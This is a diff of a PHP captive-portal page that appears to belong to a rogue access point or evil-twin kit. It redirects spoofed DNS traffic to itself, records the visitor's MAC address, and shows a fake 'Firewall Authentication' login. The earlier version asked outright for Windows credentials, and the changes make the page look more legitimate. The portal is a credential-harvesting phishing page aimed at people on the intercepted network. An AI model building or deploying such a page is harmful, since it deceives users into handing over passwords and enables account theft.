@@ -1,74 +1,58 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<html>
-<!-- Place in the root of the webserver directory -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN">
 
-<!-- ----------------------------------------------------------------------------------------------------- -->
-<!-- CUSTOMIZE THE STYLE -->
-<style>
-
-</style>
-<!-- CUSTOMIZE THE STYLE - END -->
-<!-- ----------------------------------------------------------------------------------------------------- -->
+<style type="text/css">html,body{height:100%;padding:0;margin:0;}.oc{display:table;width:100%;height:100%;}.ic{display:table-cell;vertical-align:middle;height:100%;}form{display:block;background:#ccc;border:2px solid red;padding:0 0 25px 0;width:500px;font-family:helvetica,sans-serif;font-size:14px;margin:10px auto;}.fel,.fer,.fec{text-align:center;width:350px;margin:0 auto;padding:10px;}.fel{text-align:left;}.fer{text-align:right;}h1{font-weight:bold;font-size:21px;margin:0;padding:20px 10px;text-align:center;}p{margin:15px auto;width:75%;text-align:left;}ul{margin:15px auto;width:75%;}h2{margin:25px 10px;font-weight:bold;text-align:center;}label,h2{font-size:16px;}.logo{background:#eee center 25px url(images/MGPGHGPGPFGGHHPFBGFHEHIG) no-repeat;padding-top:80px;}</style>
 
 <?php
-//DO NOT CHANGE
+// Place in the root of the webserver directory
+
+// Rename these Variables to conform with the target environment 
 $server_name = "SERVER_NAME_REPLACE";
 $domain_name = "DOMAIN_NAME_REPLACE";
 $site_name = "SITE_NAME_REPLACE";
-
+ 
 // Path to the arp command on the local server
 $arp = "/usr/sbin/arp";
-
+ 
 // The following file is used to keep track of users
 $users = "/var/lib/users";
-
-
+ 
 // Check if we've been redirected by firewall to here.
 // If so redirect to registration address
-//-----------------------------------------------------------------------------------------------------
-//TO TEST OR DEBUG - COMMENT OUT THE FOLLOWING
+// Comment out to test ------->
 //DNSSPOOF if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
 //DNSSPOOF   header("location:http://$server_name.$domain_name/index.php?add="
 //DNSSPOOF     .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
 //DNSSPOOF   exit;
 //DNSSPOOF }
-//END OF SECTIONS TO COMMENT TO TEST
-//-----------------------------------------------------------------------------------------------------
-
+// <---------
+ 
 // Attempt to get the client's mac address
 $mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
 preg_match('/..:..:..:..:..:../',$mac , $matches);
 @$mac = $matches[0];
 if (!isset($mac)) { exit; }
-
+ 
 $user = $_POST['user'];
-
+ 
 if (empty($user)) {
 //if ($code!="1234") {
   // code doesn’t equal expected value, so display form
   ?>
 
+<div class="oc"><div class="ic">
 
-<!-- ----------------------------------------------------------------------------------------------------- -->
-<!-- CUSTOMIZE THE BODY - KEEP THE VARIABLE NAMES -->
-<body bgcolor="#e7e8e9">
-<div id="content">
-<h1>Authentication Required</h1>
-<p>The following error was encountered while trying to retrieve the URL request. To access the Internet, please logon using your Windows Credentials.
-<p>
-<p>
-<form method="post">
-<p><b>Username:</b> <input name="user" type="text"></p>
-<p><b>Password:</b><input name="pass" type="password"></p>
-<p><input name="submit" value="Submit" type="submit"></p>
-<P>
-</form>
-</div>
-
-<!-- CUSTOMIZE THE BODY - END -->
-<!-- ----------------------------------------------------------------------------------------------------- -->
-
-
+  <form method='POST'>
+<h1 class="logo">Authentication Required</h1>
+<h2>Please enter your username and password to continue.</h2>
+<div class="fer">
+<label for="ft_un">Username:</label> 
+<input type='text' name='user' style="width:245px"><br></div>
+<div class="fer">
+<label for="ft_pd">Password:</label> 
+<input type='password' name='pass' autocomplete="off" style="width:245px"></div>
+<div class="fer"><input type='submit' name='submit' value='Continue'></div>
+  </form>
+</div></div>
 
   <?php
 } else {
@@ -101,15 +85,11 @@ exit;
 function print_header() {
 
   ?>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-<!-- ----------------------------------------------------------------------------------------------------- -->
-<!-- CUSTOMIZE THE HEADER -->
-<head>
-<title>ACCESS TO THIS SITE HAS BEEN BLOCKED</title>
+<title>Firewall Authentication</title>
 </head>
-<!-- CUSTOMIZE THE HEADER - END -->
-<!-- ----------------------------------------------------------------------------------------------------- -->
-
+ <body>
   <?php
 }
 
@@ -121,5 +101,4 @@ function print_footer() {
 }
 
 ?>
-
 
